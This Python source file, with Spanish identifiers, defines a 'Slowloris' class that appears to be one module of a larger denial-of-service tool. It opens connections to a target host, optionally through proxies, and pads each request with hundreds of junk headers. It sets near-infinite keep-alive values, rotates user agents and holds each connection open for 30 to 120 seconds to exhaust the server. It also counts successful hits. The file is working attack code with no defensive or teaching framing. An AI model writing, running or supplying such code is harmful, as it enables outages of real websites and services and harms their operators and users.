import asyncio
import random
import aiohttp
from aiohttp import ClientSession, ClientTimeout, ClientError

class Slowloris:
    def __init__(self, motor):
        self.motor = motor
        
    async def ejecutar(self, proxy=None):
        sesion = None
        try:
            sesion = await self.motor.pool.obtener_conexion(
                self.motor.host,
                self.motor.puerto,
                self.motor.ssl,
                proxy
            )
            
            if not sesion:
                return
                
            cabeceras = {
                "User-Agent": random.choice([
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
                    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36"
                ]),
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Connection": "keep-alive",
                "Keep-Alive": "timeout=999999, max=999999"
            }
            
            for i in range(random.randint(100, 500)):
                cabeceras[f"X-Slow-{i}"] = "0" * random.randint(100, 1000)
                
            url = f"{'https' if self.motor.ssl else 'http'}://{self.motor.host}:{self.motor.puerto}/"
            
            async with sesion.get(
                url,
                headers=cabeceras,
                timeout=ClientTimeout(total=None)
            ) as respuesta:
                await asyncio.sleep(random.randint(30, 120))
                await respuesta.read()
                
                self.motor.estadisticas.agregar_exito(len(cabeceras))
                
        except (asyncio.CancelledError, ClientError, Exception):
            self.motor.estadisticas.agregar_error()
        finally:
            if sesion:
                await self.motor.pool.liberar_conexion(sesion)